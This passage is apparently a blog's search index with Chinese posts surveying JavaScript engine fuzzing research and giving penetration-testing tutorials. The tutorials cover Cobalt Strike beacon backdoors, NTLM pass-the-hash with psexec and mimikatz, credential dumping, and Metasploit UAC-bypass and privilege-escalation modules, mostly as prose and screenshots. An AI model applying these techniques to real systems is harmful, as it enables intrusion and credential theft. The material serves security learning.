<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>jsfuzz调研</title>
    <link href="/jsfuzz%E8%B0%83%E7%A0%94/"/>
    <url>/jsfuzz%E8%B0%83%E7%A0%94/</url>
    
    <content type="html"><![CDATA[<h1 id="论文仓库"><a href="#论文仓库" class="headerlink" title="论文仓库"></a>论文仓库</h1><p><a href="https://github.com/wcventure/FuzzingPaper">https://github.com/wcventure/FuzzingPaper</a></p><h1 id="与AI结合"><a href="#与AI结合" class="headerlink" title="与AI结合"></a>与AI结合</h1><h2 id="Montage"><a href="#Montage" class="headerlink" title="Montage"></a>Montage</h2><p><a href="https://www.usenix.org/conference/usenixsecurity20/presentation/lee-suyoung">https://www.usenix.org/conference/usenixsecurity20/presentation/lee-suyoung</a></p><p>USENIX 2020</p><h3 id="所用技术"><a href="#所用技术" class="headerlink" title="所用技术"></a>所用技术</h3><p>首先是JS文件变成AST（抽象语法树）第二个阶段是将抽象语法树输入到LSTM模型进行训练，最后一个阶段就算生成JS测试样例<br><img src="/img/js%E8%B0%83%E7%A0%940.png" alt="图片" title="montage工作流程"></p><h3 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h3><p>第一个用于查找 JS 引擎漏洞的语言模型引导的模糊测试器。我们技术的关键方面是将 JS 抽象语法树 （AST） 转换为可以直接训练主流 NLML 的 AST 子树序列。实验证明了 Montage 能够生成有效的 JS 测试，并表明它在查找漏洞方面优于以前的研究，第一个用语言模型生成测试样例</p><h2 id="CovRL-Fuzz"><a href="#CovRL-Fuzz" class="headerlink" title="CovRL-Fuzz"></a>CovRL-Fuzz</h2><p><a href="https://doi.org/10.1145/3650212.3680389">https://doi.org/10.1145/3650212.3680389</a></p><p>ISSTA 2024: Proceedings of the 33rd ACM SIGSOFT International Symposium on Software Testing and Analysis</p><p>语言模型的上下文突变模糊是有前途的，但缺乏必要的覆盖率指导，论文提出了一种称为CovRL（覆盖引导强化学习）的新技术，该技术将大语言模型（LLM）与覆盖反馈的强化学习（RL）相结合。通过利用术语频率-逆文档频率 （TF-IDF） 方法构建加权覆盖率图，将覆盖率反馈直接集成到 LLM 中。</p><h3 id="所用技术-1"><a href="#所用技术-1" class="headerlink" title="所用技术"></a>所用技术</h3><p>覆盖引导的模糊测试：覆盖引导是一种常见的策略，即基于程序覆盖率来指导测试用例的生成和选择，以确保更多的代码路径被测试到。 它提高了测试的有效性，帮助识别更多潜在的漏洞。</p><p>强化学习：该论文中使用强化学习算法来自动调整和优化模糊测试的策略。 强化学习是一种机器学习方法，代理通过与环境交互，不断学习最优策略，最大化某种奖励（在这个场景中，可能是探索新的代码路径或发现错误）。</p><p>基于LLM的变异技术：大型语言模型（LLM）在生成和理解语言方面表现出色。 在这篇论文中，LLM被用于生成和修改输入数据，使得模糊测试更有针对性，可以生成更复杂和有潜在漏洞的输入。</p><p>突变：插入、覆盖、拼接<br><img src="/img/js%E8%B0%83%E7%A0%941.png" alt="图片" title="CovRLfuzz工作流程"></p><h3 id="核心-1"><a href="#核心-1" class="headerlink" title="核心"></a>核心</h3><p>将覆盖率引导的反馈直接集成到基于LLM的变异过程中</p><h1 id="不和AI结合（与JIT结合偏多）"><a href="#不和AI结合（与JIT结合偏多）" class="headerlink" title="不和AI结合（与JIT结合偏多）"></a>不和AI结合（与JIT结合偏多）</h1><h2 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h2><p>覆盖引导的模糊测试：AFL根据每个输入触发的代码路径来优化后续输入，提升测试效率。它通过位翻转、随机数据插入等方式生成新的输入，尽量覆盖更多的代码。并且进行崩溃检测AFL能够检测到崩溃、内存访问违规等异常行为。</p><h2 id="fuzzilli"><a href="#fuzzilli" class="headerlink" title="fuzzilli"></a>fuzzilli</h2><p>NDSS 2023</p><p><a href="https://www.ndss-symposium.org/wp-content/uploads/2023/02/ndss2023_f290_paper.pdf">https://www.ndss-symposium.org/wp-content/uploads/2023/02/ndss2023_f290_paper.pdf</a></p><p>提出了一个中间表示（IR）的设计和实现用于发现JIT编译器的漏洞</p><h2 id="juzzjit"><a href="#juzzjit" class="headerlink" title="juzzjit"></a>juzzjit</h2><p>usenix 2023</p><p><a href="https://www.usenix.org/system/files/sec23summer_118-wang_junjie-prepub.pdf">https://www.usenix.org/system/files/sec23summer_118-wang_junjie-prepub.pdf</a></p><p>可以为每个测试用例激活JIT编译器，并敏锐地捕捉由JIT编译器引起的任何执行差异。关键是设计一个输入包装模板，它主动激活JIT编译器，使生成的样本本身具有Oracle感知性，并在执行过程中自发地测试Oracle。我们还设计了一套变异策略，强调程序元素有希望揭示JIT编译器的错误。</p><h2 id="OptFuzz"><a href="#OptFuzz" class="headerlink" title="OptFuzz"></a>OptFuzz</h2><p>usenix 2024</p><p><a href="https://www.usenix.org/conference/usenixsecurity24/presentation/wang-jiming">https://www.usenix.org/conference/usenixsecurity24/presentation/wang-jiming</a></p><p>探索优化路径覆盖</p><p>利用一个优化主干路径度量近似的优化路径覆盖，并使用它作为一个反馈，以指导种子保存和种子调度的模糊过程。</p><p><img src="/img/js%E8%B0%83%E7%A0%942.png" alt="图片" title="JIT编译器工作流程"></p><h1 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h1><p><strong>利用RAG辅助大模型生成fuzzing测试样例从而对引擎进行漏洞的挖掘</strong></p><p>RAG——Retrieval Augmented Generation，检索增强生成。核心思想是，生成模型不依赖于仅存储在内部参数中的信息，而是通过检索外部知识库或数据库来增强生成过程，从而提供更准确和信息丰富的答案。</p><p>所以依据RAG能提高生成的测试样例的质量，从而提升覆盖率等等指标，效果会更好。</p><p>RAG目前的应用：<br><a href="https://github.com/PKU-DAIR/RAG-Survey">https://github.com/PKU-DAIR/RAG-Survey</a></p><p>java fuzzing相关数据集：</p><p>具有 PoC 的 JavaScript 引擎 CVE 的数据集：<a href="https://github.com/tunz/js-vuln-db">https://github.com/tunz/js-vuln-db</a><br>官方 ECMAScript 一致性测试套件：<a href="https://github.com/tc39/test262">https://github.com/tc39/test262</a><br>来自 ChakraCore、SpiderMonkey、V8、JavaScriptCore 和 Test262 存储库的 JS 测试套件集合：<a href="https://github.com/WSP-LAB/js-test-suite?tab=readme-ov-file">https://github.com/WSP-LAB/js-test-suite?tab=readme-ov-file</a></p><p>具体实现：</p><ol><li>构建知识库（Corpus）</li></ol><p>首先，构建一个与待测程序相关的知识库或数据集。这些数据可以包括：</p><pre><code class="hljs">现有的测试样例（覆盖的路径、触发的漏洞等）。程序的源代码或汇编代码片段，尤其是带有注释的部分，帮助语言模型理解代码逻辑。代码的控制流图、数据流图，帮助模型推理哪些路径未被充分测试。历史测试过程中生成的代码覆盖率报告，用于分析哪些部分尚未覆盖或覆盖率较低。</code></pre><ol start="2"><li>构建检索模型</li></ol><p>构建一个基于向量检索的系统，用于从知识库中检索与目标程序相关的测试信息和代码部分。这一步的关键是选择合适的检索模型来帮助生成过程：</p><pre><code class="hljs">使用双编码器（Dual Encoder）：如 BERT、DPR（Dense Passage Retrieval），将程序代码和相关数据向量化，基于输入查询找到最相关的测试片段或代码。检索与输入相关的未覆盖代码路径：基于代码的特征、函数调用栈或控制流图，从知识库中检索出尚未充分测试的路径信息，帮助生成新的输入样例。</code></pre><ol start="3"><li>生成高覆盖率的Fuzzing测试样例<br>使用语言模型生成Fuzzing测试样例，这一步中，可以结合检索到的未覆盖路径或特定的代码片段进行指导生成。（基于覆盖率的反馈循环）</li></ol><h1 id="存在的问题："><a href="#存在的问题：" class="headerlink" title="存在的问题："></a>存在的问题：</h1><h2 id="如何实现RAG"><a href="#如何实现RAG" class="headerlink" title="如何实现RAG"></a>如何实现RAG</h2><p>利用langchain：<a href="https://github.com/blackinkkkxi/RAG_langchain">https://github.com/blackinkkkxi/RAG_langchain</a><br>官方文档：<a href="https://langchain-fanyi.readthedocs.io/en/latest/modules/indexes/document_loaders.html">https://langchain-fanyi.readthedocs.io/en/latest/modules/indexes/document_loaders.html</a></p><h2 id="大模型如何学习js程序"><a href="#大模型如何学习js程序" class="headerlink" title="大模型如何学习js程序"></a>大模型如何学习js程序</h2><p>转化为json格式，Montage论文中的预处理：<a href="https://github.com/WSP-LAB/Montage/tree/master/src/preprocess">https://github.com/WSP-LAB/Montage/tree/master/src/preprocess</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透（5）</title>
    <link href="/9/"/>
    <url>/9/</url>
    
    <content type="html"><![CDATA[<h2 id="CS概述"><a href="#CS概述" class="headerlink" title="CS概述"></a>CS概述</h2><p>Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF，而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p><p>Cobalt Strike集成了端口转发、扫描、多模式Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</p><p>早期版本Cobalt Srtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用。这个工具的社区版是大家熟知的Armitage(一个MSF的图形化界面工具)，而<br>Cobalt Strike大家可以理解其为Armitage的商业版。</p><p>Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁者的后渗透行动。</p><h2 id="CS的通信流程"><a href="#CS的通信流程" class="headerlink" title="CS的通信流程"></a>CS的通信流程</h2><p>Beacon 是 Cobalt Strike 的 Payload，Beacon在隐蔽信道上提供服务，用于长期控制受感染主机。<br><img src="/img/%E6%B8%97%E9%80%8F9.2.png" alt="图片" title="CS的通信流程"></p><h2 id="Beacon安全性"><a href="#Beacon安全性" class="headerlink" title="Beacon安全性"></a>Beacon安全性</h2><p>当你启动Team Server并创建了Beacon Listener时，Team Server就会创建公钥对来保证后续传输过程的安全性。我们以分段传输payload<br>为例，详细讲解一下Cobalt Strike的安全特性。</p><ol><li>当stager下载stage时，公钥也会被一起发送：</li><li>当Beacon stage准备check in的时候，第一步就是要发送关于beacon session的元数据(Metadata)元数据中包含了用户、PID、电脑名称、IP地址等等基础信息，同时元数据中也包括了Beacon stage创建的一个随机会话密钥。为了保证安全性，Beacon stage会使用公钥加密元数据(含会话密钥)，这意味着只有Team Server才能够解密该数据包。</li><li>当Beacon从Team Server下载任务的时候，团队服务器会使用会话密钥加密这些任务，Beacon stage也会使用会话密钥来解密任务列表。</li><li>同样在返回任务结果的时候，Beacon stage也会使用会话密钥对任务输出加密。<br><img src="/img/%E6%B8%97%E9%80%8F9.3.png" alt="图片" title="公私钥机制保证安全性"><br>相信看到这里你一脸懵逼什么都不懂，没关系，我第一次看到这里我也是，接下来进入操作部分</li></ol><h2 id="CS安装"><a href="#CS安装" class="headerlink" title="CS安装"></a>CS安装</h2><p>直接把压缩包拖进去解压：<br><img src="/img/%E6%B8%97%E9%80%8F9.1.png" alt="图片" title="安装好CS"></p><p>给teamserver和cs.sh赋予权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#注意区分大小写</span><br><span class="hljs-built_in">chmod</span> +x teamserver<br><span class="hljs-built_in">chmod</span> +x cs.sh<br></code></pre></td></tr></table></figure><p>为了减少本地测试时虚拟机的数量，这里假设kali既是服务端又是客户端</p><p><img src="/img/%E6%B8%97%E9%80%8F9.4.png" alt="图片" title="成功启用CS"></p><p>这里我的密码不小心设置成了1231323<br><img src="/img/%E6%B8%97%E9%80%8F9.5.png" alt="图片" title="进入CS客户端"></p><p>生成木马</p><p>CobaltStrike 的 Payloads 通常分为：<br>    Stage(Stageless) Payload（无阶段）<br>    Stager Payload（分阶段）</p><p>它们二者的区别和关系是：<br>Stager Payload（分阶段）是一个小程序，通常是手工优化的汇编程序，它下载 Stage(Stageless) Payload（无阶段），将其注入内存，并将执行传递给它，此过程称为分阶段式。很多攻击中对于能加载进内存并在成功漏洞利用后执行的数据大小存在严格限制。这会极大地限制你的后渗透选择，除非你分阶段传送你的后渗透 payload。</p><p>在cs中创建完监听器后，我们想生成windows exe后门程序。可以看到能生成两种windows可执行程序，其分别代表staging分阶段的paylod和unstage(stageless)不分阶段的payload。</p><p><img src="/img/%E6%B8%97%E9%80%8F9.6.png" alt="图片" title="产生后门文件，不带s的"><br>接下来让目标主机点击后门文件：<br><img src="/img/%E6%B8%97%E9%80%8F9.7.png" alt="图片" title="成功上线后门主机"><br>查看拓扑图：<br><img src="/img/%E6%B8%97%E9%80%8F9.8.png" alt="图片" title="查看CS架构渗透的拓扑图"><br>接下来可以利用CS自带的提权进行操作试试，可以看到一开始是不能hashdump的：<br><img src="/img/%E6%B8%97%E9%80%8F9.9.png" alt="图片" title="进行提权操作"><br>成功拿到了Administrator的权限<br><img src="/img/%E6%B8%97%E9%80%8F9.10.png" alt="图片" title="拿到了Administrator，接下来拿system"><br>一键提权成功拿到了system并hashdump查看密码成功：<br><img src="/img/%E6%B8%97%E9%80%8F9.11.png" alt="图片" title="成功查看密码"><br>接下来就可以查看目标主机的各种东西咯，因为有了system权限：<br><img src="/img/%E6%B8%97%E9%80%8F9.12.png" alt="图片" title="查看目标主机的文件列表"><br><img src="/img/%E6%B8%97%E9%80%8F9.13.png" alt="图片" title="这就是两个攻击的进程"><br>还可以查看键盘映射、进行进程注入、与MSF进行联动等等~</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>内网渗透阶段，攻击者利用MSF获取meterpreter或者CS获取bacon之后，首先就是要获取凭证或NTLM hash值。然而获取到hash值然后破解hash难度很高，难以利用，故诞生了PTH，即获取了目标机器用户的NTLM Hash的情况下，可无需破解哈希直接使用目标的NTLM hash来完成身份验证。从红队视角看，PTH攻击（哈希传递攻击）只是windows横向渗透的开始。</p><h2 id="Windows密码凭证"><a href="#Windows密码凭证" class="headerlink" title="Windows密码凭证"></a>Windows密码凭证</h2><p>windows系统使用两种方法对用户输入的密码进行加密处理：LM Hash以及NTLM Hash。</p><p>LM Hash是windows最早使用的加密算法，其本质是DES加密，LM Hash算法较为脆弱。微软后期引入NTLM Hash，其本质是MD4 加密。操作系统密码转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。个人版在Vista之后，服务版在windows 2003 之后windows系统认证均采用NTLM Hash加密。</p><p>windows系统中密码凭证通常由LM Hash以及NTLM Hash两部分组成，结构如下：</p><ul><li>用户名称:RID:LM‐HASH值:NT‐HASH值</li></ul><p>在域环境中，密码凭证存储在%SystemRoot%ntds\ntds.dilt路径下的ntds.dit二进制文件中。在工作组环境下，用户的密码凭证被存储在%SystemRoot%\system32\config\sam路径下的SAM文件中。在渗透测试中获取windows密码凭证可以利用mimikatz，Pwddump7，WCE,注册表以及MSF、CS框架模块等获取。</p><h3 id="NTLM-HASH生成原理"><a href="#NTLM-HASH生成原理" class="headerlink" title="NTLM-HASH生成原理"></a>NTLM-HASH生成原理</h3><p>假设用户密码为： 123456</p><ol><li><p>首先将密码字符串转化为十进制ASCII字符串<br>字 符：1 2 3 4 5 6<br>ASCII：49 50 51 52 53 54</p></li><li><p>十进制ASCII字符串再转换为十六进制字符串<br>十 进 制：49 50 51 52 53 54<br>十六进制：31 32 33 34 35 36</p></li><li><p>十六进制字符串再转化为Unicode字符串<br>31 32 33 34 35 36 ‐&gt; 310032003300340035003600</p></li><li><p>使用MD4摘要算法对Unicode字符串进行Hash计算<br>310032003300340035003600 ‐&gt; 32ed87bdb5fdc5e9cba88547376818d4</p></li><li><p>产生一个16字节的值，即NTLM‐HASH<br>32ed87bdb5fdc5e9cba88547376818d4</p></li></ol><h2 id="Windows认证与NTLM协议"><a href="#Windows认证与NTLM协议" class="headerlink" title="Windows认证与NTLM协议"></a>Windows认证与NTLM协议</h2><p>windows认证包括三种方式：</p><p>1 本地认证：用户直接操作计算机登陆账户（本地直接登录）<br>2 网络认证：远程连接到工作组中的某个设备 （使用RDP远程登录某台服务器，或访问域环境中的共享资源）<br>3 域认证：登陆到域环境中的某个设备（Kerberos协议）</p><h3 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h3><p>windows登录进程（winlogon.exe）接收用户输入的密码，接收用户的输入信息后，将密码交给lsass.exe进程，这个过程中会存一份明文密码，将明文密码加密成NTLM Hash，与SAM数据库中该用户的Hash值进行比对，匹配则登陆成功，不匹配则登陆失败</p><h3 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h3><p>我们使用需要使用到NTLM协议。NTLM是一种网络认证协议，它是基于挑战（Challenge）&#x2F;响应（Response）认证机制的一种认证模式。这个协议只支持Windows。<br>NTLM在工作组环境的认证<br>在认证过程中会发送以下三种类型的消息：</p><ul><li>TYPE 1 协商：双方确定传输协议的版本、明文用户名。</li><li>TYPE 2 质询：生成Challenge</li><li>TYPE 3 身份验证：发送Response</li></ul><p>工作组中：<br><img src="/img/%E6%B8%97%E9%80%8F10.1.png" alt="图片" title="工作组认证流程"><br>协商：当客户端要访问服务器上某个受保护的服务时，需要输入服务器的用户名和密码进行验证。此时客户端会在本地缓存一份服务器密码的NTLM hash，然后向服务器发送协商消息（主要用于确认双方协议版本，在NTLM 认证中， NTLM 响应分为NTLM v1 ， NTLMv2 ， NTLM session v2 三种协议，不同协议使用不同格式的Challenge 和加密算法）。</p><p>质询：服务器收到客户端的协商信息后，生成并回复质询消息。该消息中包含了一个由服务端生成的16位随机值challenge，服务器也会在本地缓存该值。客户端收到质询消息后，会使用步骤1中缓存的服务器的NTLM hash对Challenge进行加密生成Response，接着将身份验证消息中发往服务器。</p><p>验证：服务器在收到身份验证消息后，会使用该用户所对应的NTLM hash对Challenge进行加密生成Response2，并比较Response2与Response是否一致。如果一致，就证明客户端掌握了服务器的密码，认证成功，否则认证失败。</p><h3 id="域环境下NTLM认证"><a href="#域环境下NTLM认证" class="headerlink" title="域环境下NTLM认证"></a>域环境下NTLM认证</h3><p><img src="/img/%E6%B8%97%E9%80%8F10.2.png" alt="图片" title="域环境认证流程"><br>在域环境中，由于所有域用户的哈希值都 存储在域控制器的NTDS.dit中，服务器本身无法计算Response消息，因此需要与域控建立一个安全通道，并通过域控完成最后的认证流程。前三个步骤同工作组环境的认证</p><p>4、服务器收到客户端发来的TYPE 3消息后，会将消息通过 Netlogon协议转发给域控制器。</p><p>5、域控制器根据TYPE 3消息中的用户名获取该用户名的NTLM hash，用NTLM hash对原始的Challenge进行加密并生成Response，然后将其与TYPE 3消息中Response对比。如果一致，就证明客户端掌握了服务器密码，认证成功，否则认证失败。</p><p>6、服务器根据域控返回的验证结果，对客户端进行相应的回复。</p><h2 id="PTH原理及利用"><a href="#PTH原理及利用" class="headerlink" title="PTH原理及利用"></a>PTH原理及利用</h2><p>NTLM Hash登录时需要challenge，而在NTLM协议的质询流程中，服务器端会将challenge发送给客户端（用户），使得我们无需构造challenge，所以只需要获取用户名和NTLM Hash即可通过验证。</p><p>PTH攻击可以分为两步：</p><h3 id="NTLM-Hash获取"><a href="#NTLM-Hash获取" class="headerlink" title="NTLM-Hash获取"></a>NTLM-Hash获取</h3><p>成功入侵了一台机器后，可获取受害主机或与受害主机处于同一网络的机器Hash值，在渗透测试中获取windows密码凭证可以利用mimikatz，Pwddump7，WCE,导出注册表以及MSF、CS框架模块等获取，在此不作过多描述。</p><h3 id="利用Hash完成攻击"><a href="#利用Hash完成攻击" class="headerlink" title="利用Hash完成攻击"></a>利用Hash完成攻击</h3><p>在认证的时候，我们直接提供hash值，不用提供明文密码，windows就会与保存的hash值对比，通过认证。PTH攻击常用于SMB，PsExec，WMI，RPC，RDP等各种协议登录绕过</p><p>这里使用psexec进行权限维持</p><p>msf里面的这个psexec这个模块跟powershell原生模块的区别。我们知道powershell是在2008及以上的系统才有，在2008及以上的系统使用原生powershell免杀效果是要比msf里psexec生成的payload要好的。但是在2003及以下的版本是不自带powershell的，那么在这种情况下我们就只能使用msf的psexec生成的exe进行横向移动</p><p><img src="/img/%E6%B8%97%E9%80%8F10.3.png" alt="图片" title="通过hash和psexec进行权限维持"></p><p>除此之外还可以通过mimikatz进行权限提升，也可以在线读取lsass进程,获取明文密码<br><img src="/img/%E6%B8%97%E9%80%8F10.4.png" alt="图片" title="通过mimikatz权限维持"></p><p>在Windows12R2之后，系统的lsass进程将不会在将明文保存在内存中，如此，使用mimikatz就无法直接从内存中读取密码了，先拿到目标系统的system权限，修改注册表然后重启再读取</p><p>或者使用pwdump工具来获取密码Hash</p><ul><li><a href="https://github.com/Seabreg/pwdump">https://github.com/Seabreg/pwdump</a></li></ul><p>pwdump7.exe 也可以直接拿到NTLM Hash值<br><img src="/img/%E6%B8%97%E9%80%8F10.5.png" alt="图片" title="通过pwdump权限维持"></p><p>本来还想写一下横向移动但是之前已经讲了很多提权的方法了，横向移动无非多一步扫描网段内的主机然后再进行操作，就不讲啦，之后是域渗透</p><h2 id="域的概念"><a href="#域的概念" class="headerlink" title="域的概念"></a>域的概念</h2><p>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><p>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。</p><p>域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其他域的安全信任关系。当企业网络中计算机和用户数量较多时，为了实现高效管理，就需要windows域。</p><h2 id="域的原理"><a href="#域的原理" class="headerlink" title="域的原理"></a>域的原理</h2><p>在工作组上你一切的设置在本机上进行，包括各种策略，用户登录也是登录在本机的，放在本机的数据库来验证的。而如果你的计算机密码是加入域的话，各种策略是域控制器统一设定，用户名和密码也是放到域控制器去验证，也就是说使用你的账号密码可以在同一域的任何一台计算机登录。</p><p>域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p><h2 id="域和组的区别"><a href="#域和组的区别" class="headerlink" title="域和组的区别"></a>域和组的区别</h2><p>工作组和域的区别为：创建方式不同、安全机制不同、登录方式不同。</p><ul><li>创建方式不同<br>1、工作组：工作组可以由任何一个计算机的主人来创建。<br>2、域：域只能由服务器来创建。</li><li>安全机制不同<br>1、工作组：在”工作组”中不存在组帐号，只有本机上的帐号和密码。<br>2、域：在”域”中有可以登录该域的帐号，这些由域管理员来建立。</li><li>登录方式不同<br>1、工作组：在工作组方式下，计算机启动后自动就在工作组中。<br>2、域：登录”域”是要提交”域用户名”和”密码”，一旦登录，便被赋予相应的权限。</li></ul><h2 id="相关名词解释"><a href="#相关名词解释" class="headerlink" title="相关名词解释"></a>相关名词解释</h2><h3 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h3><p>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”。 域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。域控是活动目录的存储地方，也就是说活动目录存储在域控制器内。安装了活动目录的计算机就称为域控制器，其实在你第一次安装活动目录的时候，你安装活动目录的那台计算机就成为了域控制器。一个域可以有一台或多台域控制器。最经典的做法是做一个主辅域控。</p><h3 id="AD"><a href="#AD" class="headerlink" title="AD"></a>AD</h3><p>活动目录是微软Windows Server中，负责架构中大型网路环境的集中式目录管理服务（DirectoryServices）。目录服务在微软平台上从Windows Server 2000开始引入，所以我们可以理解为活动目录是目录服务在微软平台的一种实现方式。当然目录服务在非微软平台上都有相应的实现。Windows Server 2008的域环境与工作组环境最大的不同是，域内所有的计算机共享一个集中式的目录数据库（又称为活动目录数据库），它包含着整个域内的对象（用户账户、计算机账户、打印机、共享文件等）和安全信息等等，而活动目录负责目录数据库的添加，修改，更新和删除。所以我们要在Windows Server 2008上实现域环境，其实就是要安装活动目录。活动目录为我们实现了目录服务，提供对企业网络环境的集中式管理。比如在域环境中，只需要在活动目录中创建一次Jerry账户，那么就可以在任意200台电脑中的一台上登录Jerry，如果要为Jerry账户更改密码，只需要在活动目录中更改一次就可以了，也就是说域用户信息保存在活动目录中。</p><h3 id="组织单元"><a href="#组织单元" class="headerlink" title="组织单元"></a>组织单元</h3><p>组织单元（OU）是一种容器，它里面可以包含对象（用户账户，计算机账户等），也可以包含其他的组织单元（OU）。<br><img src="/img/%E6%B8%97%E9%80%8F11.1.png" alt="图片" title="组织单元"></p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域是在Windows NT&#x2F;2000&#x2F;2003网络环境中组建客户机&#x2F;服务器网络的实现方式。所谓域,是由网络管理员定义的一组计算机集合,实际上就是一个网络。在这个网络中,至少有一台称为域控制器的计算机,充当服务器角色。在域控制器中保存着整个网络的用户账号及目录数据库,即活动目录。构建域后,管理员可以对整个网络实施集中控制和管理。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>当需要配置一个包含多个域的网络时,应该将网络配置成域目录树结构。域目录树是一种树型结构。在整个域目录树中,所有域共享同一个活动目录,即整个域目录树中只有一个活动目录。在配置一个较大规模的企业网络时,可以配置为域目录树结构,比如将企业总部的网络配置为根域,各分支机构的网络配置为子域,整体上形成一个域目录树,以实现集中管理。</p><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>服务主体名称(SPN)是服务实例，可以理解为一个服务，比如mssql,http等等的唯一标识符。<br>如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN，Kerberos 身份验证使用 SPN 将服务实例与服务登录帐户相关联。</p><p>个人觉得现在基本也没有用Windows去搭服务器的牛人了，所以暂时就先不进行具体的实操记录，需要环境的可以私聊我~</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Cobalt Strike</tag>
      
      <tag>渗透工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透（4）</title>
    <link href="/7/"/>
    <url>/7/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过后门进入到目标主机之后用getsystem是不能直接拿到系统的system权限的，第一次会超时，第二次会报错，那么需要怎么使用MSF拿到系统权限呢？<br><img src="/img/%E6%B8%97%E9%80%8F7.1.png" alt="图片" title="没有正确拿到系统权限"></p><h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><p>UAC:用户账户控制（User Account Control，简写作UAC）是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。<br><img src="/img/%E6%B8%97%E9%80%8F7.2.png" alt="图片" title="WIN7下的UAC"></p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><h4 id="绕过UAC进行提权-需要弹窗提问"><a href="#绕过UAC进行提权-需要弹窗提问" class="headerlink" title="绕过UAC进行提权-需要弹窗提问"></a>绕过UAC进行提权-需要弹窗提问</h4><p>在默认情况下，UAC是开启的，当程序需要更多的权限时，需要弹窗确认。</p><p>这里使用msf中的<strong>local&#x2F;ask模块</strong>:<br><img src="/img/%E6%B8%97%E9%80%8F7.3.png" alt="图片" title="设置好filename（弹出时的文件名称）和session（已经建立好的session会话，sessions命令可以查看）"><br>随后使用<code>run</code>命令开始攻击，目标主机进行弹窗提问：<br><img src="/img/%E6%B8%97%E9%80%8F7.4.png" alt="图片" title="成功发出弹窗"><br>当目标主机点击了“是”则会成功提权：<br><img src="/img/%E6%B8%97%E9%80%8F7.5.png" alt="图片" title="可以看到目前已经是系统权限了"></p><h4 id="绕过UAC进行提权-不用弹窗提问"><a href="#绕过UAC进行提权-不用弹窗提问" class="headerlink" title="绕过UAC进行提权-不用弹窗提问"></a>绕过UAC进行提权-不用弹窗提问</h4><p>利用local&#x2F;bypassuac<br><img src="/img/%E6%B8%97%E9%80%8F7.6.png" alt="图片" title="可以看到目前已经是系统权限了"></p><h4 id="利用系统漏洞直接提权"><a href="#利用系统漏洞直接提权" class="headerlink" title="利用系统漏洞直接提权"></a>利用系统漏洞直接提权</h4><p>此local_exploit模块可以列出所有的可以进行提权的Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#列出可以使用的exp有哪些</span><br>use post/multi/recon/local_exploit_suggester<br></code></pre></td></tr></table></figure><p>可以看到列出了很多漏洞其中Yes的都是可以利用的漏洞：<br><img src="/img/%E6%B8%97%E9%80%8F7.7.png" alt="图片" title="标红的就不用看了"><br>经过测试下来有<strong>一半左右</strong>是可用的，拿到webshell以后，再反弹shell给msf，然后结合msf做内网渗透。</p><h2 id="Linux提权合集"><a href="#Linux提权合集" class="headerlink" title="Linux提权合集"></a>Linux提权合集</h2><p><a 